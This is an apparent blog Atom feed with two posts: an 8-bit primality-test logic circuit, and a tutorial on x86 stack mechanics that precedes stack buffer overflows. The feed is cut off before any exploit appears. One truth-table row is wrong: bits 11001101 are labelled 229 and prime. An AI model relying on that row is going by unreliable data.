<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://markusthill.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://markusthill.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2024-12-18T19:01:29+00:00</updated><id>https://markusthill.github.io/feed.xml</id><title type="html">blank</title><subtitle>Personal notes and code snippets on math, ML &amp; programming. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">Designing an 8-Bit Integer Primality Test Using Logic Circuits</title><link href="https://markusthill.github.io/blog/2024/primality-test-logical-circuit/" rel="alternate" type="text/html" title="Designing an 8-Bit Integer Primality Test Using Logic Circuits"/><published>2024-12-18T01:16:00+00:00</published><updated>2024-12-18T01:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/primality-test-logical-circuit</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/primality-test-logical-circuit/"><![CDATA[<p>When working with digital circuits and number theory, I found that an interesting challenge is determining whether a given number is prime through purely combinational logic. Recently, I developed a circuit diagram for testing the primality of 8-bit integers using a Boolean function <code class="language-plaintext highlighter-rouge">f(a,b,c,d,e,f,g,h)</code>.</p> <h2 id="from-truth-table-to-near-minimal-form">From Truth Table to Near-Minimal Form</h2> <p>The process started with a comprehensive truth table that enumerated all possible 8-bit inputs (0 to 255) and flagged which of those are prime. This truth table served as the cornerstone of the design, capturing every input-to-output mapping.</p> <p>An excerpt of the table is listed below</p> <table> <thead> <tr> <th><code class="language-plaintext highlighter-rouge">a</code></th> <th><code class="language-plaintext highlighter-rouge">b</code></th> <th><code class="language-plaintext highlighter-rouge">c</code></th> <th><code class="language-plaintext highlighter-rouge">d</code></th> <th><code class="language-plaintext highlighter-rouge">e</code></th> <th><code class="language-plaintext highlighter-rouge">f</code></th> <th><code class="language-plaintext highlighter-rouge">g</code></th> <th><code class="language-plaintext highlighter-rouge">h</code></th> <th style="text-align: right"><code class="language-plaintext highlighter-rouge">Decimal</code></th> <th style="text-align: right"><code class="language-plaintext highlighter-rouge">Prime?</code></th> </tr> </thead> <tbody> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td style="text-align: right">0</td> <td style="text-align: right">0</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td style="text-align: right">1</td> <td style="text-align: right">0</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td style="text-align: right">2</td> <td style="text-align: right">1</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>1</td> <td style="text-align: right">3</td> <td style="text-align: right">1</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>0</td> <td style="text-align: right">4</td> <td style="text-align: right">0</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td style="text-align: right">5</td> <td style="text-align: right">1</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td>1</td> <td style="text-align: right">11</td> <td style="text-align: right">1</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td style="text-align: right">21</td> <td style="text-align: right">0</td> </tr> <tr> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td style="text-align: right">37</td> <td style="text-align: right">1</td> </tr> <tr> <td>0</td> <td>1</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td style="text-align: right">65</td> <td style="text-align: right">0</td> </tr> <tr> <td>0</td> <td>1</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>0</td> <td>1</td> <td style="text-align: right">73</td> <td style="text-align: right">1</td> </tr> <tr> <td>0</td> <td>1</td> <td>1</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td style="text-align: right">97</td> <td style="text-align: right">1</td> </tr> <tr> <td>1</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td style="text-align: right">129</td> <td style="text-align: right">0</td> </tr> <tr> <td>1</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>1</td> <td>0</td> <td>1</td> <td style="text-align: right">141</td> <td style="text-align: right">0</td> </tr> <tr> <td>1</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td>1</td> <td style="text-align: right">171</td> <td style="text-align: right">0</td> </tr> <tr> <td>1</td> <td>1</td> <td>0</td> <td>0</td> <td>1</td> <td>1</td> <td>0</td> <td>1</td> <td style="text-align: right">229</td> <td style="text-align: right">1</td> </tr> <tr> <td>1</td> <td>1</td> <td>1</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>1</td> <td style="text-align: right">227</td> <td style="text-align: right">1</td> </tr> <tr> <td>1</td> <td>1</td> <td>1</td> <td>1</td> <td>1</td> <td>1</td> <td>0</td> <td>1</td> <td style="text-align: right">253</td> <td style="text-align: right">0</td> </tr> </tbody> </table> <p><br/></p> <p>With the initial definition in hand, I applied the <a href="https://en.wikipedia.org/wiki/Quine%E2%80%93McCluskey_algorithm">Quine-McCluskey (QMC) algorithm</a> — a classic Boolean simplification method. This gave a minimal solution in terms of prime (not related to the primality test problem which we are solving here) implicants. However, the theoretically minimal form doesn’t always translate to the most practical implementation. To address this, I performed additional algebraic factorizations, aiming to balance minimality and practical constraints like the total number of gates and propagation delay. The final result is a near-minimal form that efficiently represents the primality function.</p> <h2 id="interactivity-and-exploration">Interactivity and Exploration</h2> <p>If you’re curious to see this in action, I’ve provided an interactive environment where you can experiment with the inputs and observe the outputs directly. Feel free to play around and tweak bits—try changing the inputs and see how the circuit responds. You can toggle one of the 8 bits at the top of the diagram to generate your own 8-bit integer.</p> <p><a href="https://circuitverse.org/users/283769/projects/prime_number_test"><strong>Try it out here!</strong></a>: <a href="https://circuitverse.org/users/283769/projects/prime_number_test">https://circuitverse.org/users/283769/projects/prime_number_test</a></p> <h2 id="logic-circuit-diagram">Logic Circuit Diagram</h2> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-18-primality-test-logical-circuit/diagram_1-480.webp 480w,/assets/img/2024-12-18-primality-test-logical-circuit/diagram_1-800.webp 800w,/assets/img/2024-12-18-primality-test-logical-circuit/diagram_1-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-18-primality-test-logical-circuit/diagram_1.png" class="img-fluid rounded z-depth-1 imgcenter" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 1:</b> Logic Circuit Diagram for the 8-bit Integer Primality Test. In this example the input is set to 233. You can interact with the diagram <a href="https://circuitverse.org/users/283769/projects/prime_number_test">here</a> and run a simulation. </figcaption> </figure> <h2 id="additional-insights">Additional Insights</h2> <p>The techniques applied here — truth table construction, Quine-McCluskey minimization, and further algebraic optimization — aren’t limited to primality tests. They’re part of the essential toolbox for digital logic design. By working through such an example, you’ll gain a deeper understanding of the trade-offs between perfect minimization and practical considerations like flexibility and ease of modification.</p> <p>Whether your interest is in digital design, number theory, or just satisfying your technical curiosity, this project provides a tangible demonstration of how logic circuits can represent and solve a mathematical concept like primality.</p>]]></content><author><name></name></author><category term="electronics"/><category term="boolean algebra"/><category term="prime numbers"/><summary type="html"><![CDATA[When working with digital circuits and number theory, I found that an interesting challenge is determining whether a given number is prime through purely combinational logic. Recently, I developed a circuit diagram for testing the primality of 8-bit integers using a Boolean function `f(a,b,c,d,e,f,g,h)`.]]></summary></entry><entry><title type="html">Stack Overflow Vulnerabilities</title><link href="https://markusthill.github.io/blog/2024/buffer-overflows/" rel="alternate" type="text/html" title="Stack Overflow Vulnerabilities"/><published>2024-12-16T05:16:00+00:00</published><updated>2024-12-16T05:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/buffer-overflows</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/buffer-overflows/"><![CDATA[<p>Buffer overflows remain one of the most common security vulnerabilities in modern software and typically result from improperly written programs. A buffer overflow occurs when a program allocates too little memory for a given amount of data. The excess data then overwrites adjacent memory areas, which can contain sensitive information such as program flow data, process memory, or pointers. Because attackers can manipulate this overwritten information to execute malicious code, buffer overflows are considered critical vulnerabilities.</p> <p>Most of today’s computer systems are based on the von Neumann architecture, where both data and programs reside in the same memory. This design makes it easier for attackers to exploit buffer overflows once they occur. However, the root cause of these vulnerabilities lies in careless programming practices; the von Neumann architecture merely facilitates their exploitation. In many programming languages, such as C or C++, memory overflow checks are left to the programmer, who may forget to implement them altogether or do so incorrectly.</p> <p>By contrast, buffer overflows in Java are virtually impossible because Java programs run within a runtime environment that detects and prevents memory overflows. Similarly, interpreted programming languages are rarely affected.</p> <p>For simplicity, this blog post will focus on buffer overflows on x86/IA-32 architectures. However, the underlying techniques are very similar for newer architectures.</p> <h2 id="process-memory-organization">Process Memory Organization</h2> <p>In order to understand the attack methods that exploit different buffer overflow vulnerabilities, it is necessary to first discuss the organization of the process memory in more detail.<br/> Typically, a process is provided with its own virtual address space by the operating system, with which it can work. For 32-bit systems, for example, the virtual address space can comprise up to \(2^{32}\) addresses. Few processes will require the complete virtual address space. Therefore, it is not necessary and often impossible to assign a physical address to each virtual address. If necessary, the memory management unit (MMU) of the CPU will convert the virtual addresses into physical addresses.</p> <p>The memory of a process is divided into different areas, described in more detail below:</p> <ol> <li> <p><strong>Text segment</strong><br/> The executable code of the program is stored in the text segment. This segment can usually be accessed only in a read-only manner; write operations are prohibited and lead to an error. Hence, runtime code manipulation is not possible. Literals and constant pointers are usually stored in this segment as well.</p> </li> <li> <p><strong>Data segment</strong><br/> In general, all global and static variables are stored in the data segment of the process memory. Static variables are declared locally within functions but maintain their values when the function exits, so they cannot be placed on the stack like classic local variables.<br/> In the data segment itself, a distinction is often made between two areas: Data and BSS (Block Start by Symbol). The initialized global and static variables are stored in the Data area, while the non-initialized variables reside in the BSS area. The BSS area is usually zero-initialized, so variables that are not explicitly initialized by the programmer do not contain unexpected values.</p> </li> <li> <p><strong>Heap</strong><br/> During process runtime, memory can be dynamically allocated and released on the heap. The heap is used if the memory on the stack is insufficient or if the size of data structures can only be determined at runtime.</p> </li> <li> <p><strong>Stack</strong><br/> As mentioned, unlike global variables, local variables are placed on the stack. The stack can be visualized like a stack of plates: items are added (pushed) to the top and removed (popped) from the top.<br/> The stack is usually supported directly by the hardware of common processor architectures and plays a significant role in memory management, especially when functions/procedures are called. The following chapter will delve deeper into this topic.</p> </li> </ol> <p>In most processor architectures, the stack grows from the highest virtual memory address to the lower one. The heap grows in the opposite direction. Usually, the process memory layout will look like this:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/memoryOrga-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/memoryOrga-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/memoryOrga-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2018-02-05-buffer-overflows/memoryOrga.png" class="img-fluid rounded z-depth-1 imgcenter" width="300px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 1:</b> Process memory layout. </figcaption> </figure> <h2 id="intel-x86ia-32-architecture">Intel x86/IA-32 Architecture</h2> <p>In general, processor architectures are classified as either <strong>Little-Endian</strong> or <strong>Big-Endian</strong>, depending on how they store multibyte data in memory. On <strong>Little-Endian</strong> architectures, the “Least Significant Byte” (LSB) is stored at the lower memory address, and the “Most Significant Byte” (MSB) at the higher address. <strong>Big-Endian</strong> architectures do the opposite.</p> <p>The Intel x86/IA-32 architecture we are examining uses the Little-Endian representation. This characteristic plays a significant role in certain vulnerabilities, particularly off-by-one buffer overflows.</p> <h3 id="base-registers">Base Registers</h3> <p>The base registers include EAX, EBX, ECX, EDX, ESP, EBP, ESI, and EDI. While each register has its own function, only ESP and EBP are essential for understanding the assembly code that follows.</p> <p><strong>ESP (Extended Stack Pointer)</strong><br/> This register points to the current position in the stack. Operations like <code class="language-plaintext highlighter-rouge">push</code> (placing an element on the stack) and <code class="language-plaintext highlighter-rouge">pop</code> (removing the last element from the stack) change the stack pointer automatically. However, the ESP register can also be manipulated directly.</p> <p><strong>EBP (Extended Base Pointer),</strong> often called the <strong>frame pointer</strong>, plays an important role in stack operations. When a function is called, EBP is set as a reference point for all stack operations within that function. Unlike ESP, the value of EBP remains constant throughout the function’s execution. It is updated only when control leaves the function. This design allows local variables on the stack to be addressed via offsets relative to the frame pointer. The area bounded by the frame pointer and stack pointer is known as the <strong>stack frame</strong>.</p> <h2 id="how-the-stack-works">How the Stack works</h2> <p>The following is a simple example of how the stack works. A small C-program serves as an example:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">y</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff2</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
	<span class="n">i</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">;</span>
 	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
	<span class="n">foo</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <p>For this code, you get the following assembly output:</p> <p>Function <code class="language-plaintext highlighter-rouge">main()</code>:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>
<span class="err">2</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>
<span class="err">3</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x18</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">4</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">5</span>	<span class="nf">push</span>   <span class="kc">$</span><span class="mh">0x9</span>
<span class="err">6</span>	<span class="nf">push</span>   <span class="kc">$</span><span class="mh">0x1</span>
<span class="err">7</span>	<span class="nf">call</span>   <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="nv">foo</span><span class="o">&gt;</span>
<span class="err">8</span>	<span class="nf">add</span>    <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">9</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">10</span>	<span class="nf">leave</span>
<span class="err">11</span>	<span class="nf">ret</span></code></pre></figure> <p>Function <code class="language-plaintext highlighter-rouge">foo()</code>:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>
<span class="err">2</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>
<span class="err">3</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x38</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">4</span>	<span class="nf">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">5</span>	<span class="nf">add</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">6</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mh">0xffffffd4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">7</span>	<span class="nf">mov</span>    <span class="mh">0xffffffd4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">8</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">9</span>	<span class="nf">leave</span>
<span class="err">10</span>	<span class="nf">ret</span></code></pre></figure> <p>First, an explanation of the <code class="language-plaintext highlighter-rouge">main()</code> function:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span> <span class="nf">push</span> <span class="o">%</span><span class="nb">ebp</span>
<span class="err">2</span> <span class="nf">mov</span> <span class="o">%</span><span class="nb">esp</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p>The first two instructions appear in practically all functions. In line 1, the current frame pointer (hereafter FP0) is pushed onto the stack. In line 2, the stack pointer (ESP) is copied into EBP. At this address, the stack frame for <code class="language-plaintext highlighter-rouge">main()</code> begins.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">3</span> <span class="nf">sub</span> <span class="kc">$</span><span class="mh">0x18</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">4</span> <span class="nf">sub</span> <span class="kc">$</span><span class="mh">0x8</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p>These two instructions reserve memory space on the stack for the local variables <code class="language-plaintext highlighter-rouge">i</code> and <code class="language-plaintext highlighter-rouge">buff</code>. The <code class="language-plaintext highlighter-rouge">sub</code> operation moves the stack pointer toward lower addresses. Specifically, lines 3 and 4 subtract a total of 0x20 (decimal 32) from the ESP register. This is a direct manipulation of the stack pointer. Because the stack grows from higher to lower addresses, the operation must be a subtraction rather than an addition. (The fact that more memory is reserved than necessary will be discussed below.)</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">5</span> <span class="nf">push</span> <span class="kc">$</span><span class="mh">0x9</span>
<span class="err">6</span> <span class="nf">push</span> <span class="kc">$</span><span class="mh">0x1</span></code></pre></figure> <p>Next, the function call to <code class="language-plaintext highlighter-rouge">foo()</code> is prepared. The function expects two parameters, which are pushed onto the stack in lines 5 and 6. It is important to note that parameters must be placed on the stack in reverse order compared to their order in the C program.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">7</span> <span class="nf">call</span> <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="nv">foo</span><span class="o">&gt;</span></code></pre></figure> <p>After passing the parameters, execution branches to the <code class="language-plaintext highlighter-rouge">foo()</code> function. The <code class="language-plaintext highlighter-rouge">call</code> instruction performs two steps. First, the return address (RIP) is pushed onto the stack. This address points to the instruction that should execute after <code class="language-plaintext highlighter-rouge">foo()</code> returns—in this case, line 8 of the <code class="language-plaintext highlighter-rouge">main()</code> function. Second, the instruction pointer (EIP) is updated so that the program resumes execution at <code class="language-plaintext highlighter-rouge">foo()</code>. The stack now looks like this at this point in time:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/stack7-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/stack7-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/stack7-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2018-02-05-buffer-overflows/stack7.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 2:</b> Stack layout when calling <code class="language-plaintext highlighter-rouge">foo()</code>. </figcaption> </figure> <p>As mentioned before, execution now continues in the <code class="language-plaintext highlighter-rouge">foo()</code> function:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span> <span class="nf">push</span> <span class="o">%</span><span class="nb">ebp</span>
<span class="err">2</span> <span class="nf">mov</span> <span class="o">%</span><span class="nb">esp</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p>These first two lines mirror those in the <code class="language-plaintext highlighter-rouge">main()</code> function. The current frame pointer (FP1) is pushed onto the stack (line 1), and then the stack pointer (ESP) is copied into EBP (line 2). This allows the original frame pointer to be restored later when returning to <code class="language-plaintext highlighter-rouge">main()</code>.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">3</span> <span class="nf">sub</span> <span class="kc">$</span><span class="mh">0x38</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p>In line 3, memory space for the local variables is reserved on the stack by moving the stack pointer to a lower address.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">4</span> <span class="nf">mov</span> <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">5</span> <span class="nf">add</span> <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">6</span> <span class="nf">mov</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mh">0xffffffd4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span></code></pre></figure> <p>Line 4 loads the parameter <code class="language-plaintext highlighter-rouge">y</code> into the EAX register. This illustrates the purpose of the frame pointer, as function parameters are accessed relative to EBP rather than via absolute addresses. Here, parameter <code class="language-plaintext highlighter-rouge">y</code> is located 12 bytes (<code class="language-plaintext highlighter-rouge">0xc</code>) above the frame pointer, with the space in between taken by parameter <code class="language-plaintext highlighter-rouge">x</code>, the return address, and the previously saved frame pointer.</p> <p>Line 5 adds parameter <code class="language-plaintext highlighter-rouge">x</code> (located 8 bytes above EBP) to the value in EAX.<br/> Line 6 then stores the result in the local variable <code class="language-plaintext highlighter-rouge">i</code>, which is at a negative offset (in two’s complement form) relative to EBP.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">7</span> <span class="nf">mov</span> <span class="mh">0xffffffd4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">8</span> <span class="nf">mov</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span></code></pre></figure> <p>Lines 7 and 8 are generally unnecessary. Presumably, they were intended to move the function’s return value into EAX (where numeric return values are typically placed). However, because EAX already holds the correct value, these instructions could be omitted.</p> <p>At this point, the stack looks like this:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/stack8-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/stack8-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/stack8-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2018-02-05-buffer-overflows/stack8.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 3:</b> Stack layout for <code class="language-plaintext highlighter-rouge">foo()</code>. </figcaption> </figure> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">9</span> <span class="nf">leave</span></code></pre></figure> <p>Line 9 prepares to leave the function, and can be thought of as a shorthand for:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">movl</span> <span class="o">%</span><span class="nb">ebp</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="nf">popl</span> <span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p>The <code class="language-plaintext highlighter-rouge">leave</code> instruction sets the stack pointer (ESP) to the current frame pointer (EBP). The old frame pointer is then located precisely at ESP, and a <code class="language-plaintext highlighter-rouge">pop</code> loads this saved frame pointer back into EBP.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">10</span> <span class="nf">ret</span></code></pre></figure> <p>After <code class="language-plaintext highlighter-rouge">leave</code> executes, the stack pointer points to the previously stored return address. The <code class="language-plaintext highlighter-rouge">ret</code> instruction (line 10) loads this address into the instruction register, resuming execution in <code class="language-plaintext highlighter-rouge">main()</code>.</p> <p>Back in <code class="language-plaintext highlighter-rouge">main()</code>, the last four instructions are processed:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">8</span> <span class="nf">add</span> <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p>After the function call, the parameters on the stack are no longer needed and must be removed. Line 8 removes 0x10 (16) bytes, not just 8 bytes for the two parameters (each 4 bytes). The extra 8 bytes likely stem from an additional reservation on the stack before each function call (see line 4). This reservation appears to be linked to a bug in the GCC compiler, as discussed below. Consequently, both the parameters and the extra 8 bytes must be reclaimed from the stack.</p> <p>Strictly speaking, if no further operations occur in <code class="language-plaintext highlighter-rouge">main()</code> after the <code class="language-plaintext highlighter-rouge">foo()</code> call, cleaning up the stack is not mandatory. Nevertheless, these instructions clearly illustrate the function call mechanism and stack usage.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">9</span>  <span class="nf">mov</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">10</span> <span class="nf">leave</span>
<span class="err">11</span> <span class="nf">ret</span></code></pre></figure> <p>In these final lines, <code class="language-plaintext highlighter-rouge">main()</code> sets its return value to zero (line 9). The <code class="language-plaintext highlighter-rouge">leave</code> instruction resets ESP to EBP (line 10), and the <code class="language-plaintext highlighter-rouge">ret</code> instruction (line 11) terminates <code class="language-plaintext highlighter-rouge">main()</code> by popping the saved return address into the instruction register.</p> <p>The following animation provides a slightly simplified illustration of the entire process:</p> <div style="width: 100%" class="imgcenter"> <swiper-container keyboard="true" navigation="true" pagination="true" pagination-clickable="true" pagination-dynamic-bullets="true" rewind="true"> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack1-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack1-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack1-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack2-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack2-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack2-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack3-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack3-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack3-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack4-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack4-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack4-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack5-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack5-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack5-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack5.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" 